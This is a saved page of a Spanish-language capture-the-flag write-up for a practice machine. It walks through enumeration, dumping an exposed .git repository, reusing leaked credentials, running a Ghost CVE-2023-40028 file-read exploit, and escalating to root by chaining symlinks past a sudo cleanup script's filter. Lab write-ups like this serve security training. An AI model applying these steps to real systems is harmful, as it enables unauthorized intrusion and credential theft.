<!DOCTYPE html>
<!-- saved from url=(0050)https://secret.club/2022/05/11/fuzzing-solana.html -->
<html lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1"><meta name="theme-color" content="#111111"><meta property="og:image" content="/assets/twitter.png"><link rel="preload" href="./fonts.min.css" as="style"><link rel="stylesheet" href="./fonts.min.css"><link rel="alternate" type="application/atom+xml" title="juanchan.es RSS" href="https://juanchan.es">

    <title>Máquina 1</title>


    <meta name="generator" content="Jekyll v3.9.3"><meta property="og:title" content="maquinas/ctf"><meta name="author" content="addison"><meta property="og:locale" content="en_US"><meta name="description" content="maquinas/ctf juanchan.es"><meta property="og:description" content="maquinas/ctf juanchan.es"><link rel="canonical" href="https://juachan.es"><meta property="og:url" content="https://juachan.es"><meta property="og:site_name" content="juanchan"><meta property="og:type" content="article"><meta property="article:published_time" content="2022-05-11T07:00:00+00:00"><script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"addison"},"dateModified":"2022-05-11T07:00:00+00:00","datePublished":"2022-05-11T07:00:00+00:00","description":"maquinas/ctf juanchan.es","headline":"maquinas/ctf juanchan","mainEntityOfPage":{"@type":"WebPage","@id":"https://juanchan.es"},"url":"https://juanchan.es"}</script><style> * { margin: 0; padding: 0; box-sizing: border-box; color: inherit; text-decoration: inherit; } html { background: var(--bg-0); color: var(--text-0); width: 100%; text-rendering: optimizeLegibility; font-feature-settings: "kern" 1; font-feature-settings: "liga" 1; min-width: 100vw; overflow-x: hidden; -webkit-text-size-adjust: 100%; } @media all and (min-width:640px) { html{ font-size: 16.5px; } } @media all and (min-width:720px) { html{ font-size: 17px; } } @media all and (min-width:960px) { html{ font-size: 18px; } } body { max-width: 944px; margin: 0 auto; padding: 0 24px; font-family: "Charter", serif; } header, h1, h2, h3, .sans { font-family: 'Space Grotesk', Helvetica, sans-serif; } code, .mono, summary { font-family: 'Source Code Pro', monospace; font-weight: 500; } .img-right { float: right; height: 300px; padding-left: 2em } body > header { display: flex; justify-content: space-between; align-items: center; margin: 2em 0; } nav a { margin-left: 1.5em; letter-spacing: 0.07em; font-size: .9rem; } :root { --text-0: rgba(255, 255, 255, 87%); --text-1: rgba(255, 255, 255, 60%); --bg-0: #121212; --bg-1: rgba(255, 255, 255, 5%); --bg-2: rgba(255, 255, 255, 12%); --accent: #ef5350; --keyword: #b794f6; --string: #89a2f6; --literal: #f88478; --type: #f8819c; } @media (prefers-color-scheme: light) { :root { --text-0: rgba(0, 0, 0, 87%); --text-1: rgba(0, 0, 0, 66%); --bg-0: #fff; --bg-1: #f2f2f2; --bg-2: rgba(0, 0, 0, 12%); --keyword: #7c4dff; --string: #586ada; --literal: #d14641; --type: #bd00f8; } } .tags, .pagination > :nth-child(2) { margin-bottom: 2rem; } .tags, .pagination .mono { color: var(--text-1); font-size: 0.8rem; } .tags > a, .pagination .mono { color: var(--accent); } .pagination { display: flex; justify-content: space-between; flex-wrap: wrap-reverse; } .pagination > a { font-size: 0.9rem; display: inline-block; } .pagination .mono { letter-spacing: 0.07em; } article > :not(main) { font-size: 16px; } article > h1 { font-size: 2rem; margin-bottom: 12px; } .authors { position: absolute; margin-top: 4px; color: var(--text-1); } .authors > a { color: var(--text-0); } article > div > img { display: inline; object-fit: cover; height: 48px; width: 48px; border-radius: 100%; margin-right: 8px; background: var(--bg-1); } article > time { color: var(--text-1); position: absolute; margin: -24px 0 0 56px; } article > hr { width: 128px; border: 2.5px solid var(--bg-1); margin-top: 12px; } main { margin: 2rem 0; } main > :nth-last-child(2) { margin-bottom: 2rem; } main img, main video, main iframe, main object { max-width: 100%; height: auto; display: flex; margin: auto; } main iframe { width: 100%; height: 504px; } p, ul, ol { line-height: 1.35; margin-bottom: 1rem; } details + :not(details) { margin-top: 1rem; } details + h3, details + h2, details + h1 { margin-top: 1.2rem; } object { margin-bottom: 1rem; } h1, h2, h3 { position: relative; margin: 1.2rem 0 0.2rem 0; } h3, h2 { line-height: 24px; } main h1:before, h2:before, h3:before { content: "#"; color: var(--accent); font-weight: bold; float: left; margin-left: -19px; position: absolute; } h3:before { content: ""; margin-left: -17px; height: 10px; width: 10px; background: var(--accent); border-radius: 100%; top: calc(50% - 6px); } h1 { font-size: 1.3em; } h2 { font-size: 1.2em; } h3 { font-size: 1.1em; } p a, main li a { text-decoration: underline; } summary { margin-left: -17px; cursor: pointer; } summary::marker { color: var(--accent); } details :nth-child(2) { margin-top: 0.8rem; } ul { list-style: none; } ul li, ol li { padding-left: 1rem; margin: 0 0 0.2rem 1rem; } ul li::before { content: "•"; float: left; margin-left: -2rem; transform: scale(1.4); } blockquote { color: var(--text-1); font-style: italic; margin: 0 2em; } .footnotes { border-top: 1px solid var(--bg-1); padding-top: 1rem; } pre { border-left: 4px solid var(--bg-1); margin: 0 0 1rem -24px; padding-left: 20px; overflow-x: scroll; scrollbar-width: none; -ms-overflow-style: none; } pre::-webkit-scrollbar { width: 0; height: 0; } :not(pre) > code { background: var(--bg-1); padding: 2px 4px; } pre > code { display: inline-block; } code { font-size: 14px; } @media screen and (min-width: 640px) { code { font-size: 15px; } } @media screen and (max-width: 944px) { main iframe { height: calc((100vw - 24px) * 0.5625); } blockquote { margin: 0 0 0 1.25em; } ul li::before { margin-left: -1.25rem; } ul li { padding-left: 0.625rem; margin-left: 0.625rem; } ol li { padding-left: 0.25rem; } } .aside { color: var(--text-1); } @media screen and (min-width: 1074px) { article::before { background: radial-gradient( circle at center, var(--bg-1) 25%, transparent 25% ), transparent; background-size: 10px 10px; content: ""; display: block; height: 300px; width: 300px; position: absolute; transform: translate(-72px, -72px); z-index: -1; } article { padding: 24px 0 0 24px; margin: -24px 0 0 -24px; background: var(--bg-0); } article h1:first-of-type { margin-top: 0; } body > header { margin-bottom: 5em; } } @media screen and (max-width: 1584px) { .aside { position: relative; padding: 4px 0 4px 0; border-bottom: 1.5px solid var(--bg-1); border-top: 1.5px solid var(--bg-1); } } @media screen and (min-width: 1584px) { .aside { float: left; position: absolute; left: 0; transform: translate(calc(-100% - 28px), calc(-100% - 1rem)); width: 320px; text-align: right; clear: both; } footer { position: absolute; left: calc(100% + 24px); width: 320px; top: 0; } } code .gu, code .gh { font-weight: bold; } code .p { color: var(--text-1); } code .c, code .ch, code .cm, code .cp, code .cpf, code .c1, code .cs { color: var(--text-1); } code .o, code .ow { color: var(--keyword); } code .k, code .kn, code .kc, code .kp, code .kr, code .nt, code b { color: var(--keyword); font-weight: bold; } code .kt, code .kd, code .nb, code .nl, code .nv, code .vc, code .vg, code .vi, code .vm, code .gd { color: var(--type); } code .m, code .mb, code .mf, code .mh, code .mi, code .mo, code .il, code .se { color: var(--literal); } code .s, code .sa, code .sb, code .sc, code .dl, code .sd, code .s2, code .sh, code .si, code .sx, code .sr, code .s1, code .ss, code .gi { color: var(--string); }</style>
    </head>


<body><header align="center"><a href="/maquinas.html">Máquinas/CTF</a><nav><a href="/">Sobre mi</a></nav></header>


    <article aria-label="Content" itemscope="" itemtype="http://schema.org/BlogPosting"><h1 itemprop="name headline">Máquina resuelta</h1><div itemprop="author" itemscope="" itemtype="http://schema.org/Person" style="height:48px"> <img itemprop="image" alt="main authors image" src="./agile.jpg"> <span class="mono authors"> <a href="https://secret.club/author/addison" itemprop="name">Agile</a> </span></div><time datetime="2022-05-11T07:00:00+00:00" itemprop="datePublished" class="mono"> Feb, 2023 </time><hr><main itemprop="articleBody" style="position: relative">






<h2 id="1-realizamos-un-escaneo-tcp">1. Realizamos un escaneo TCP</h2>
<pre><code class="language-bash">PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:f8:b9:68:c8:eb:57:0f:cb:0b:47:b9:86:50:83:eb (ECDSA)
|_  256 a2:ea:6e:e1:b6:d7:e7:c5:86:69:ce:ba:05:9e:38:13 (ED25519)
80/tcp open  http    Apache httpd
|_http-title: Did not follow redirect to http://linkvortex.htb/
|_http-server-header: Apache
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
</code></pre>
<p>&nbsp;</p>
<h2 id="2-identificamos-la-web-y-realizamos-la-enumeración">2. Identificamos la web y realizamos la enumeración</h2>
<p>Para identificar las tecnologías de la web utilizamos <strong>Whatweb</strong>, y observamos la siguiente salida:</p>
<pre><code class="language-bash">http://linkvortex.htb [200 OK] Apache, Country[RESERVED][ZZ], HTML5, HTTPServer[Apache], IP[10.10.11.47], JQuery[3.5.1], MetaGenerator[Ghost 5.58], Open-Graph-Protocol[website], PoweredBy[Ghost,a], Script[application/ld+json], 
        Title[BitByBit Hardware], X-Powered-By[Express], X-UA-Compatible[IE=edge]
</code></pre>
<p>Si buscamos por internet, encontramos la siguiente vulnerabilidad para la version concreta de ghost: <a href="https://github.com/0xDTC/Ghost-5.58-Arbitrary-File-Read-CVE-2023-40028/blob/master/CVE-2023-40028">https://github.com/0xDTC/Ghost-5.58-Arbitrary-File-Read-CVE-2023-40028/blob/master/CVE-2023-40028</a>, la cual de momento no nos sirve para mucho, pues no disponemos de credenciales válidos.</p>
<p>Realizamos una enumeración de dominios, meidante el siguiente comando:</p>
<pre><code class="language-bash"># gobuster vhost -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -u linkvortex.htb -t 50 --append-domain 
</code></pre>
<p>Obteniendo la siguiente salida:</p>
<pre><code class="language-bash">Found: dev.linkvortex.htb Status: 200 [Size: 2538]
</code></pre>
<p>Por último, realizamos una enumeración de directorios:</p>
<pre><code class="language-bash"># gobuster dir -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://dev.linkvortex.htb/  -t 200 -b 404 esa34521
</code></pre>
<p>Obteniendo lo siguiente:</p>
<pre><code class="language-bash">/.git/config          (Status: 200) [Size: 201]
/.hta                 (Status: 403) [Size: 199]
/.htpasswd            (Status: 403) [Size: 199]
/.git/HEAD            (Status: 200) [Size: 41]
/.git/logs/           (Status: 200) [Size: 868]
/.htaccess            (Status: 403) [Size: 199]
/cgi-bin/             (Status: 403) [Size: 199]
/.git/index           (Status: 200) [Size: 707577]
/index.html           (Status: 200) [Size: 2538]
/server-status        (Status: 403) [Size: 199]
/.git                 (Status: 301) [Size: 239] [--&gt; http://dev.linkvortex.htb/.git/]
</code></pre>
<p>&nbsp;</p>
<h2 id="3-directorio-git">3. Directorio .git</h2>
<p>Dentro del endpoint <code>.git</code> encontramos lo siguiente:</p>
<pre><code class="language-bash">[ ]	HEAD	2024-12-02 10:10 	41 	 
[ ]	config	2024-12-02 10:10 	201 	 
[ ]	description	2024-12-02 10:10 	73 	 
[DIR]	hooks/	2024-12-02 10:10 	- 	 
[ ]	index	2024-12-02 10:56 	691K	 
[DIR]	info/	2024-12-02 10:10 	- 	 
[DIR]	logs/	2024-12-02 10:10 	- 	 
[DIR]	objects/	2024-12-02 10:56 	- 	 
[ ]	packed-refs	2024-12-02 10:10 	147 	 
[DIR]	refs/	2024-12-02 10:10 	- 	 
[ ]	shallow	2024-12-02 10:10 	82 	 
</code></pre>
<p>Descargamos el repositorio en local con el siguiente comando:</p>
<pre><code class="language-bash"># wget --mirror -I http://dev.linkvortex.htb/.git/
</code></pre>
<p>Si realizamos un <code># git status</code>, vemos como se añadieron dos archivos:</p>
<pre><code class="language-bash">- Docker-compose.yml
- ghost/core/test/regression/api/admin/authentication.test.js
</code></pre>
<p>Utilizamos la herramineta GitHack para descargar todo el repositorio .git y conseguir así dichos ficheros (<a href="https://github.com/lijiejie/GitHack">https://github.com/lijiejie/GitHack</a>)</p>
<p>&nbsp;</p>
<h2 id="4-analisis-de-ficheros">4. Analisis de ficheros</h2>
<p>En el fichero ghost/core/test/regression/api/admin/authentication.test.js encontramos lo siguiente:</p>
<pre><code class="language-bash">it(&#39;complete setup&#39;, async function () {
            const email = &#39;test@example.com&#39;;
            const password = &#39;OctopiFociPilfer45&#39;;
</code></pre>
<p>En ved de utilizar test@example, probamos utilizando otros usuarios, uno de ellos es <a href="mailto:&#97;&#x64;&#109;&#105;&#110;&#64;&#108;&#105;&#x6e;&#107;&#118;&#111;&#114;&#116;&#x65;&#120;&#x2e;&#x68;&#116;&#98;">&#97;&#x64;&#109;&#105;&#110;&#64;&#108;&#105;&#x6e;&#107;&#118;&#111;&#114;&#116;&#x65;&#120;&#x2e;&#x68;&#116;&#98;</a>.</p>
<p>También si seguimos buscando encontramos un Docker Compose, con el siguiente contenido:</p>
<pre><code class="language-bash">FROM ghost:5.58.0

# Copy the config
COPY config.production.json /var/lib/ghost/config.production.json

# Prevent installing packages
RUN rm -rf /var/lib/apt/lists/* /etc/apt/sources.list* /usr/bin/apt-get /usr/bin/apt /usr/bin/dpkg /usr/sbin/dpkg /usr/bin/dpkg-deb /usr/sbin/dpkg-deb

# Wait for the db to be ready first
COPY wait-for-it.sh /var/lib/ghost/wait-for-it.sh
COPY entry.sh /entry.sh
RUN chmod +x /var/lib/ghost/wait-for-it.sh
RUN chmod +x /entry.sh

ENTRYPOINT [&quot;/entry.sh&quot;]
CMD [&quot;node&quot;, &quot;current/index.js&quot;]
</code></pre>
<p>&nbsp;</p>
<h2 id="5-ghost-exploit">5. Ghost exploit</h2>
<p>Utilizamos el exploit comentado en el punto 2, ahora que disponemos de credenciales, para realizar un Path Traversal (<a href="https://github.com/0xDTC/Ghost-5.58-Arbitrary-File-Read-CVE-2023-40028/blob/master/CVE-2023-40028">https://github.com/0xDTC/Ghost-5.58-Arbitrary-File-Read-CVE-2023-40028/blob/master/CVE-2023-40028</a>):</p>
<p>Ejecutamos:</p>
<pre><code class="language-bash"># ./CVE-2023-40028 -u admin@linkvortex.htb -p OctopiFociPilfer45 -h http://linkvortex.htb
</code></pre>
<p>En los archivos que antes listamos en el git, uno de ellos era un Docker Compose, en el observamos que existe un archivo de configuración en la ruta <code>/var/lib/ghost/config.production.json</code>, por lo que podemos aprovacher dicho LFI, para obtener el siguiente archivo. En el cual aparece lo siguiente:</p>
<pre><code class="language-bash">},
&quot;mail&quot;: {
    &quot;transport&quot;: &quot;SMTP&quot;,
    &quot;options&quot;: {
    &quot;service&quot;: &quot;Google&quot;,
    &quot;host&quot;: &quot;linkvortex.htb&quot;,
    &quot;port&quot;: 587,
    &quot;auth&quot;: {
        &quot;user&quot;: &quot;bob@linkvortex.htb&quot;,
        &quot;pass&quot;: &quot;fibber-talented-worth&quot;
        }
    }
    }
}
</code></pre>
<p>&nbsp;</p>
<h2 id="6-acceso-al-equipo">6. Acceso al equipo</h2>
<p>Por lo que probamos las credenciales de bob:fibber-talented-worth para acceder por ssh y observamos que conseguimos acceso. Por lo que somos capaces de obtener la flag de usuario.</p>
<p>&nbsp;</p>
<h2 id="7-escalado-de-privilegios">7. Escalado de privilegios</h2>
<p>Ejecutamos <code># sudo -l</code> para ver si el usaurio bob tiene alguna capacidad de ejecución como el usaurio root:</p>
<pre><code class="language-bash">User bob may run the following commands on linkvortex:
    (ALL) NOPASSWD: /usr/bin/bash /opt/ghost/clean_symlink.sh *.png
</code></pre>
<p>Si vemos dicho script, observamos lo siguiente:</p>
<pre><code class="language-bash">#!/bin/bash                                                                             
QUAR_DIR=&quot;/var/quarantined&quot;                                                             				
if [ -z $CHECK_CONTENT ];then                                                          
CHECK_CONTENT=false                                                                   
fi                                    
LINK=$1                                                                                
if ! [[ &quot;$LINK&quot; =~ \.png$ ]]; then                                                     
/usr/bin/echo &quot;! First argument must be a png file !&quot;                                  
exit 2                                                                                
fi                                                                    				
if /usr/bin/sudo /usr/bin/test -L $LINK;then                                            
LINK_NAME=$(/usr/bin/basename $LINK)                                                 
LINK_TARGET=$(/usr/bin/readlink $LINK)                                             
if /usr/bin/echo &quot;$LINK_TARGET&quot; | /usr/bin/grep -Eq &#39;(etc|root)&#39;;then             
    /usr/bin/echo &quot;! Trying to read critical files, removing link [ $LINK ] !&quot;         
    /usr/bin/unlink $LINK                                                           
else                                                                              
    /usr/bin/echo &quot;Link found [ $LINK ] , moving it to quarantine&quot;               
    /usr/bin/mv $LINK $QUAR_DIR/                                                  
    if $CHECK_CONTENT;then                                                         
    /usr/bin/echo &quot;Content:&quot;                                                        
    /usr/bin/cat $QUAR_DIR/$LINK_NAME 2&gt;/dev/null                                   
    fi                                                                             
fi                                                                              
fi   
</code></pre>
<p>Vemos que se trata de un programa para mover archivos a cuanrentena y posteriormente leerlos. Tiene una restricción de que no se pueden leer archivos o rutas que contengan las palabras root o etc,  por lo que podemos crear un enlace simbólico para leer así la flag de root:</p>
<pre><code class="language-bash"># ln -s /root/root.txt /home/bob/1.png
# ln -s /home/bob/1.png /home/bob/2.png
# sudo CHECK_CONTENT=true /usr/bin/bash /opt/ghost/clean_symlink.sh /home/bob/2.png
</code></pre>
<p>Y somo capaces de obtener la flag de root</p>
        
        




<p>&nbsp;</p><p>&nbsp;</p>
</div>
     <div class="footer-credits" style="display: flex; justify-content: flex-end">
        <a> Made by Juan González </a>
    </div>
</div>
</body></html>